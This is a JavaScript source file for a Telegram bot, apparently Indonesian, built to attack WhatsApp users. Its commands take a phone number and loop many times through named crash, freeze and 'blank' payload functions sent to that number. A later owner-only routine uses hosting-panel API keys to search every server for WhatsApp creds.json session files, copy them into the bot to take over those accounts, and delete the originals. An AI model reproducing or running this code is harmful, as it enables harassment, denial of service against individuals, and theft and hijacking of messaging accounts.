bot.command("Fc", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /Fc 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: Forclose Home
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 50; i++) {
    await fcinvisotax(target)
    await sleep(2000);
    await FcSpam(target)
    await sleep(2000);
    await StickersAbimZ(target)
    await sleep(5000);
  }
});
bot.command("DelayTag", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /DelayTag 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target : ${q}
🛡️ Mode : DelayInvisible
🧪 Status: Delay sedang dikirim...
• ⏳ BEBAS SPAM BUG, SILAHKAN BUG LAGI
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 15; i++) {
    await InvisibleVoc(target)
    await sleep(5000);
    await StickersAbimZ(target)
    await sleep(5000);
    await AxGBlorr(target)
    await sleep(5000);
    await AxDrainbim(target)
    await sleep(5000);
    await KxHJule(sock, target);
    await sleep(5000);
  }
});
bot.command("magicdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /magicdelay 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target : ${q}
🛡️ Mode : DelayInvisible
🧪 Status: Delay sedang dikirim...
• ⏳ BEBAS SPAM BUG, SILAHKAN BUG LAGI
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 15; i++) {
    await StickersAbimZ(target)
    await sleep(5000);
    await AxGBlorr(target)
    await sleep(5000);
  }
});
bot.command("XiosBug", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /XiosBug 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: XiosBug
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 500; i++) {
    await crashphoto(target)
    await sleep(2000);
    await LocationOtax(target)
    await sleep(2000);
    await Ghostwolf(target)
    await sleep(2000);
    await fcinvisotax(target)
    await sleep(3000);
    await stikerNotifx(target)
    await sleep(300);
    await InvisibleStctyip(target)
    await sleep(500);
    await InvisibleVoc(target)
    await sleep(5000);
    await AxGBlorr(target)
    await sleep(5000);
    await StickersAbimZ(target)
    await sleep(5000);
    await AxDrainbim(target)
    await sleep(5000);
    await CrashBetajj(target)
    await sleep(2000);
    await ForceInfinitybak(target)
    await sleep(1000);
    await frezeui(target)
    await sleep(500);
    await NanCrashiPhone(target)
    await sleep(500);
    await markdelayrer(target)
    await sleep(1000);
    await storyOfMyLive(target)
    await sleep(1000);
    await BlankPack(target)
    await sleep(1000);
    await SaturnuZLay2(target)
    await sleep(200);
    await blankVy(target)
    await sleep(200);
    await Bimblankv2(target)
    await sleep(200);
    await protocolbug6(target)
    await sleep(200);
    await KelraxX(target)
    await sleep(200);
    await protocolbug5(target)
    await sleep(200);
    await MediaInvis(target)
    await sleep(200);
  }
});
bot.command("Delaysuper", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /Delaysuper 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: Delay Hard
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 200; i++) {
    await delayspamsyg(target)
    await sleep(3000);
    await InvisibleStctyip(target)
    await sleep(3000);
    await InvisibleVoc(target)
    await sleep(5000);
    await AxGBlorr(target)
    await sleep(5000);
    await StickersAbimZ(target)
    await sleep(5000);
    await AxDrainbim(target)
    await sleep(5000);
    await abangbaim(target)
    await sleep(3000);
    await frezeui(target)
    await sleep(2000);
    await DelayHard(target)
    await sleep(3000);
    await crashphoto(target)
    await sleep(2000);
    await Salsamontok(target)
    await sleep(2000);
    await proto2(target)
    await sleep(2000);
    await proto3(target)
    await sleep(2000);
    await protov(target)
    await sleep(2000);
    await proto5(target)
    await sleep(2000);
    await proto6(target)
    await sleep(2000);
    await invCallzlwq(target)
    await sleep(2000);
  }
});
bot.command("Xsystem", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /Xsystem 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: Xsystem
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 5; i < 25; i++) {
    await Ghostwolf(target)
    await sleep(3000);
    await fcinvisotax(target)
    await sleep(3000);
    await BlankPack(target)
    await sleep(3000);
    await InvisibleStctyip(target)
    await sleep(2000);
    await StickersAbimZ(target)
    await sleep(5000);
    await InvisibleVoc(target)
    await sleep(5000);
    await AxGBlorr(target)
    await sleep(5000);
    await AxDrainbim(target)
    await sleep(5000);
    await CrashBetajj(target)
    await sleep(3000);
    await ForceInfinitybak(target)
    await sleep(3000);
    await frezeui(target)
    await sleep(500);
    await NanCrashiPhone(target)
    await sleep(500);
    await LocationOtax(target)
    await sleep(1000);
    await crashphoto(target)
    await sleep(800);
    await apollox(target)
    await sleep(600);
    await SaturnuZLay2(target)
    await sleep(600);
    await JandaMudaHai(target)
    await sleep(1000);
    await blankVy(target)
    await sleep(600);
    await Bimblankv2(target)
    await sleep(500);
    await protocolbug6(target)
    await sleep(600);
    await KelraxX(target)
    await sleep(600);
    await protocolbug5(target)
    await sleep(600);
    await MediaInvis(target)
    await sleep(600);
    await storyOfMyLive(target)
    await sleep(1000);
    await KelraxX(target)
    await sleep(600);
    await JtwFrezeBlank(target)
    await sleep(600);
    await WolkerBlank(target)
    await sleep(600);
  }
});
bot.command("xworfcspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /xworfcspam 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: xworfcspam
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 25; i++) {
    await crasphoneNew(target)
    await sleep(4000);
    await await BlankPack(target)
    await sleep(2000);
    await AxDrainbim(target)
    await sleep(5000);
    await fcinvisotax(target)
    await sleep(3000);
    await StickersAbimZ(target)
    await sleep(5000);
    await CrashBetajj(target)
    await sleep(3000);
    await InvisibleStctyip(target)
    await sleep(2000);
    await AxGBlorr(target)
    await sleep(5000);
    await abangbaim(target)
    await sleep(3000);
    await fcinvisotax(target)
    await sleep(3000);
    await InvisibleStctyip(target)
    await sleep(2000);
    await NanCrashiPhone(target)
    await sleep(2000);
    await fcinvisotax(target)
    await sleep(3000);
    await invCallzlwq(target)
    await sleep(2000);
    await Ghostwolf(target)
    await sleep(2000);
    await ForceInfinitybak(target)
    await sleep(3000);
    await delayspamsyg(target)
    await sleep(3000)
    await LocationOtax(target)
    await sleep(2000);
    await fcinvisotax(target)
    await sleep(3000);
    await ForceInfinitybak(target)
    await sleep(1000);
    await BlankPack(target)
    await sleep(3000);
    await DelayHard(target)
    await sleep(3000);
    await markdelayrer(target)
    await sleep(1000);
    await InvisibleVoc(target)
    await sleep(5000);
    await fcinvisotax(target)
    await sleep(3000);
    await apollox(target)
    await sleep(2000);
    await WolkerBlank(target)
    await sleep(600);
    await blankVy(target)
    await sleep(600);
    await SaturnuZLay2(target)
    await sleep(600);
    await MediaInvis(target)
    await sleep(600);
    await crashphoto(target)
    await sleep(800);
    await JandaMudaHai(target)
    await sleep(1000);
    await KelraxX(target)
    await sleep(200);
    await storyOfMyLive(target)
    await sleep(1000);
    await Bimblankv2(target)
    await sleep(500);
    await stikerNotifx(target)
    await sleep(300);
    await Bimblankv2(target)
    await sleep(500);
    await protocolbug5(target)
    await sleep(200);
    await protocolbug6(target)
    await sleep(600);
    await frezeui(target)
    await sleep(500);
  }
});
bot.command("blankinvisible", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /blankinvisible 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: blankinvisible
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 25; i++) {
    await Ghostwolf(target)
    await sleep(1000);
    await InvisibleVoc(target)
    await sleep(5000);
    await fcinvisotax(target);
    await sleep(2000);
    await ForceInfinitybak(target);
    await sleep(3000);
    await crasphoneNew(target);
    await sleep(4000);
    await fcinvisotax(target)
    await sleep(3000);
    await NanCrashiPhone(target)
    await sleep(2000);
    await InvisibleVoc(target)
    await sleep(5000);
    await fcinvisotax(target)
    await sleep(3000);
    await abangbaim(target)
    await sleep(3000);
    await OtaxNewUiAbim(target)
    await sleep(1000);
    await fcinvisotax(target)
    await sleep(3000);
    await AxGBlorr(target)
    await sleep(5000);
    await JandaMudaHai(target)
    await sleep(1000);
    await fcinvisotax(target)
    await sleep(3000);
    await KelraxX(target)
    await sleep(200);
  }
});
bot.command("xworrspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /xworrspam 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: xworrspam
🧪 Status:⏳ BEBAS SPAM BUG, SILAHKAN BUG LAGI
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 15; i++) {
    await AxGBlorr(target);
    await sleep(5000)
    await InvisibleVoc(target)
    await sleep(5000);
    await StickersAbimZ(target);
    await sleep(5000);
    await fcinvisotax(target)
    await sleep(3000);
    await AxDrainbim(target)
    await sleep(5000);
  }
});
bot.command("xworblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /xworblank 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: blank cursed invisible
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 25; i++) {
    await OtaxNewUiAbim(target)
    await sleep(1000);
    await NanCrashiPhone(target)
    await sleep(2000);
    await fcinvisotax(target)
    await sleep(3000);
    await InvisibleVoc(target)
    await sleep(5000);
    await fcinvisotax(target)
    await sleep(3000);
    await abangbaim(target)
    await sleep(3000);
    await crasphoneNew(target)
    await sleep(4000);
    await AxGBlorr(target)
    await sleep(5000);
    await fcinvisotax(target)
    await sleep(3000);
    await JandaMudaHai(target)
    await sleep(1000);
    await KelraxX(target)
    await sleep(200);
  }
});
bot.command("xvorrblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /xvorrblank 628xxxx");

  const cooldownData = readCooldownData();
  const now = Date.now();
  const { cooldown, lastUsed } = cooldownData.payload;

  if (now - lastUsed < cooldown) {
    const sisa = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(
      `⚠️ *Cooldown*\nTunggu *${sisa}* sebelum memakai command ini lagi.`
    );
  }

  await ctx.sendPhoto("https://files.catbox.moe/32hze5.jpg", {
    caption: `
<b>『 S E N D I N G  B U G 』</b>
📞 Target: ${q}
🎮 Status: Success
🛡️ Mode: xvorrblank
🕰️ Jeda: 5 Menit Bego
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${q}` }]],
    },
  });

  cooldownData.payload.lastUsed = now;
  saveCooldownData(cooldownData);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  for (let i = 0; i < 25; i++) {
    await YxGfreez(target)
    await sleep(3000);
    await SemestaOneHit(target)
    await sleep(3000);
  }
});
bot.command('DelBug', checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const senderId = ctx.from.id;
    const chatId = ctx.chat.id;
    const text = ctx.message.text;
    
    // Ambil argumen setelah /DelBug
    const args = text.split(' ').slice(1).join(' ');
    if (!args) {
      return ctx.reply('Cara Pakai Nih Njing!!!\nContoh: /DelBug 62xxx');
    }

    let pepec = args.replace(/[^0-9]/g, '');
    if (!pepec.startsWith('62')) {
      return ctx.reply('Contoh : /DelBug 62xxx');
    }

    const target = `${pepec}@s.whatsapp.net`;
    const clearBugText = "SYNC CLEAR BUGS\n" + "\n".repeat(600) + "VOIDLINE GHOST DONE CLEAR BUGS";

    // Kirim 4x pesan ke target
    for (let i = 0; i < 4; i++) {
      await Abim.sendMessage(target, { text: clearBugText });
    }

    await ctx.reply('🛡️ Done Clear Bug By Zarr!!!');
  } catch (err) {
    console.error('Error:', err);
    await ctx.reply('Ada kesalahan saat mengirim bug.');
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)


const ADP_DIR = path.join(__dirname, "adp")
fs.mkdirpSync(ADP_DIR)
const ADP_FILE = path.join(ADP_DIR, "adp.json")

function loadADP() {
  try {
    return JSON.parse(fs.readFileSync(ADP_FILE, "utf8"))
  } catch {
    return {}
  }
}
function saveADP(o) {
  fs.writeFileSync(ADP_FILE, JSON.stringify(o, null, 2))
}
function isPtlc(t) {
  return typeof t === "string" && /^ptlc_/i.test(t)
}
function isPtla(t) {
  return typeof t === "string" && /^ptla_/i.test(t)
}
function asText(x) {
  return typeof x === "string" ? x : JSON.stringify(x)
}
function baseUrl(d) {
  let u = String(d || "").trim()
  if (!/^https?:\/\//i.test(u)) u = "https://" + u
  return u.replace(/\/+$/, "")
}

async function httpGet(url, token) {
  return AX.get(url, { headers: { Authorization: `Bearer ${token}` } })
}
async function httpPost(url, token, data) {
  return AX.post(url, data, { headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" } })
}

async function listServersClient(b, ptlc) {
  const r = await httpGet(`${b}/api/client/servers`, ptlc)
  if (r.status !== 200) throw new Error(`${r.status}`)
  const a = r.data?.data || []
  return a.map((x) => ({ id: x.attributes.identifier, name: x.attributes.name || x.attributes.identifier }))
}
async function listServersApplication(b, ptla) {
  const r = await httpGet(`${b}/api/application/servers`, ptla)
  if (r.status !== 200) throw new Error(`${r.status}`)
  const a = r.data?.data || []
  return a
    .map((x) => {
      const at = x.attributes || {}
      return { id: at.identifier || at.uuidShort || at.uuid, name: at.name || at.identifier || at.uuidShort }
    })
    .filter((x) => x.id)
}
async function listServersWithFallback(b, ptlc, ptla) {
  if (isPtlc(ptlc)) {
    try {
      const s = await listServersClient(b, ptlc)
      if (s.length) return s
    } catch {}
  }
  if (isPtla(ptla)) {
    try {
      const s = await listServersApplication(b, ptla)
      if (s.length) return s
    } catch {}
  }
  return []
}

const QUICK_PATHS = [
  "/session/creds.json",
  "/home/container/session/creds.json",
  "/home/container/creds.json",
  "/container/creds.json",
  "/creds.json",
  "creds.json",
]

async function listDirAny(base, ptlc, ptla, sid, dir) {
  if (isPtlc(ptlc)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptlc)
      if (r.status === 200) return (r.data?.data || []).map((x) => x.attributes || x)
    } catch {}
  }
  if (isPtla(ptla)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptla)
      if (r.status === 200) return (r.data?.data || []).map((x) => x.attributes || x)
    } catch {}
  }
  return []
}

async function readFileAny(base, ptla, ptlc, sid, filePath) {
  if (isPtla(ptla)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptla)
      if (r.status === 200) return asText(r.data)
    } catch {}
  }
  if (isPtlc(ptlc)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptlc)
      if (r.status === 200) return asText(r.data)
    } catch {}
  }
  throw new Error("gagal_baca_file")
}

async function deleteFileAny(base, ptla, ptlc, sid, filePath) {
  const body = { root: "/", files: [String(filePath).replace(/^\/+/, "")] }
  if (isPtlc(ptlc)) {
    try {
      const r = await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptlc, body)
      if (r.status === 204 || r.status === 200) return
    } catch {}
  }
  if (isPtla(ptla)) {
    try {
      const r = await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptla, body)
      if (r.status === 204 || r.status === 200) return
    } catch {}
  }
  throw new Error("gagal_hapus_file")
}

async function discoverCredsPaths(base, ptlc, ptla, sid, maxDepth = 3, maxDirs = 150) {
  for (const qp of QUICK_PATHS) {
    try {
      await readFileAny(base, ptla, ptlc, sid, qp)
      return [qp]
    } catch {}
  }
  const roots = ["/", "/home", "/home/container", "/container", "/root", "/home/container/session", "/home/container/bot", "/home/container/data"]
  const q = [...new Set(roots)]
  const seen = new Set(q)
  let depth = 0,
    expanded = 0
  while (q.length && depth < maxDepth && expanded < maxDirs) {
    const size = q.length
    for (let i = 0; i < size && expanded < maxDirs; i++) {
      const dir = q.shift()
      expanded++
      let items = []
      try {
        items = await listDirAny(base, ptlc, ptla, sid, dir)
      } catch {}
      for (const it of items) {
        const name = String(it.name || "")
        const isDir = it.is_file === false || it.type === "directory" || it.directory === true || it.is_directory === true
        if (!isDir) {
          if (name.toLowerCase() === "creds.json") {
            const p = `${String(it.directory || dir).replace(/\/+$/, "")}/${name}`
            return [p]
          }
          continue
        }
        if (name === "." || name === "..") continue
        const child = `${String(it.directory || dir).replace(/\/+$/, "")}/${name}`
        if (!seen.has(child)) {
          seen.add(child)
          q.push(child)
        }
      }
    }
    depth++
  }
  return QUICK_PATHS.slice(0, 2)
}

async function writeAndPairFromRaw(raw, chatId, ctx) {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), "sess-"))
  try {
    const src = typeof raw === "string" ? JSON.parse(raw) : raw
    if (!src || typeof src !== "object") throw new Error("creds_invalid")
    const meIdRaw = (src.me && src.me.id) || (src.creds && src.creds.me && src.creds.me.id) || ""
    const num = String(meIdRaw).split(":")[0].replace(/\D/g, "")
    if (!num) throw new Error("creds_invalid")
    if (!src.me || !src.me.id) {
      src.me = { ...(src.me || {}), id: `${num}@s.whatsapp.net` }
    }
    const credsPath = path.join(tmp, "creds.json")
    await fs.writeJson(credsPath, src, { spaces: 2 })
    const dest = path.join(__dirname, "session")
    await fs.remove(dest)
    await fs.copy(tmp, dest)
    try {
      linkedWhatsAppNumber = num
    } catch {}
    if (typeof connectToWhatsApp === "function") {
      console.log(`⸙ 𝐒𝐘𝐍𝐂 — Pairing ${num}`)
      await connectToWhatsApp(num, chatId, ctx)
      console.log(`⸙ 𝐒𝐘𝐍𝐂— ${num} sukses connect`)
    } else if (typeof startSesi === "function") {
      console.log(`⸙ 𝐒𝐘𝐍𝐂— Start session untuk ${num}`)
      await startSesi()
      console.log(`⸙ 𝐒𝐘𝐍𝐂— ${num} sukses connect`)
    } else {
      throw new Error("fungsi_koneksi_tidak_ditemukan")
    }
    return num
  } catch (e) {
    console.error(`⸙ 𝐒𝐘𝐍𝐂— Gagal pairing: ${e.message}`)
    throw e
  } finally {
    await fs.remove(tmp).catch(() => {})
  }
}

function pLimit(n) {
  let a = 0,
    q = []
  const next = () => {
    if (q.length && a < n) {
      a++
      const { fn, rs, rj } = q.shift()
      fn()
        .then((v) => {
          a--
          rs(v)
          next()
        })
        .catch((e) => {
          a--
          rj(e)
          next()
        })
    }
  }
  return (fn) =>
    new Promise((rs, rj) => {
      q.push({ fn, rs, rj })
      next()
    })
}

bot.command("cadp", checkOwner, checkGroupOnly, async (ctx) => {
  const args = ctx.message.text.split(/\s+/).slice(1)
  if (args.length < 2) return ctx.reply(errBox(["Format: /cadp <alias> <ptla,ptlc,domain>"]), { parse_mode: "Markdown" })
  const key = args[0]
  const parts = args[1].split(",").map((s) => s.trim())
  if (parts.length < 3) return ctx.reply(errBox(["Format: /cadp <alias> <ptla,ptlc,domain>"]), { parse_mode: "Markdown" })
  const [ptla, ptlc, domain] = parts
  const data = loadADP()
  data[key] = { ptla, ptlc, domain }
  saveADP(data)
  await ctx.reply(okBox([`ADP '${key}' disimpan`]), { parse_mode: "Markdown" })
})

bot.command("adplist", checkOwner, checkGroupOnly, async (ctx) => {
  const data = loadADP()
  const lines = Object.entries(data).map(([k, v]) => `${k} → ${v.domain} • ${String(v.ptla || "").slice(0, 10)}… • ${String(v.ptlc || "").slice(0, 10)}…`)
  await ctx.reply(lines.length ? okBox(lines) : errBox(["(kosong)"]), { parse_mode: "Markdown" })
})

bot.command("deladp", checkOwner, checkGroupOnly, async (ctx) => {
  const args = ctx.message.text.split(/\s+/).slice(1)
  if (!args.length) return ctx.reply(errBox(["Format: /deladp <alias>"]), { parse_mode: "Markdown" })
  const key = args[0]
  const data = loadADP()
  if (!data[key]) return ctx.reply(errBox([`Alias '${key}' tidak ada`]), { parse_mode: "Markdown" })
  delete data[key]
  saveADP(data)
  await ctx.reply(okBox([`ADP '${key}' dihapus`]), { parse_mode: "Markdown" })
})

bot.command("adp", checkOwner, checkGroupOnly, async (ctx) => {
    const args = ctx.message.text.split(/\s+/).slice(1)
    if (!args.length) return ctx.reply(errBox(["Format: /adp <alias>"]), { parse_mode: "Markdown" })
    const key = args[0]
    const cfg = loadADP()[key]
    if (!cfg) return ctx.reply(errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" })
    const b = baseUrl(cfg.domain)
    let servers = []
    try {
      servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla)
      if (!servers.length) return ctx.reply(errBox([`Tidak ada server pada ${b}`]), { parse_mode: "Markdown" })
    } catch (e) {
      const msgErr = e?.response ? `${e.response.status} ${e.response.statusText || ""}`.trim() : e.message || "gagal"
      return ctx.reply(errBox([`Gagal koneksi: ${msgErr}`]), { parse_mode: "Markdown" })
    }
    let ok = 0,
      fail = 0
    const perServerErrors = []
    const limit = pLimit(6)
    const progressMsg = await ctx.reply(okBox([`⎙ 𝗺𝗲𝗺𝗽𝗿𝗼𝘀𝗲𝘀\n𝘀𝗲𝗿𝘃𝗲𝗿: ${servers.length}\n𝗱𝗼𝗺𝗮𝗶𝗻: ${b}`]), { parse_mode: "Markdown" })
    await Promise.allSettled(
      servers.map((s) =>
        limit(async () => {
          try {
            let paired = false
            const paths = await discoverCredsPaths(b, cfg.ptlc, cfg.ptla, s.id)
            for (const p of paths) {
              try {
                const raw = await readFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
                await writeAndPairFromRaw(raw, ctx.chat.id, ctx)
                try {
                  await deleteFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
                } catch {}
                ok++
                paired = true
                break
              } catch {}
            }
            if (!paired) throw new Error("creds_not_found")
          } catch (e) {
            fail++
            perServerErrors.push(`✖ ${s.id} ∿ ${e.message || "gagal"}`)
          }
        })
      )
    )
    const lines = [`⸙ 𝐒𝐘𝐍𝐂— SELESAI\nSukses: ${ok} • Gagal: ${fail}`]
    if (perServerErrors.length) lines.push(...perServerErrors)
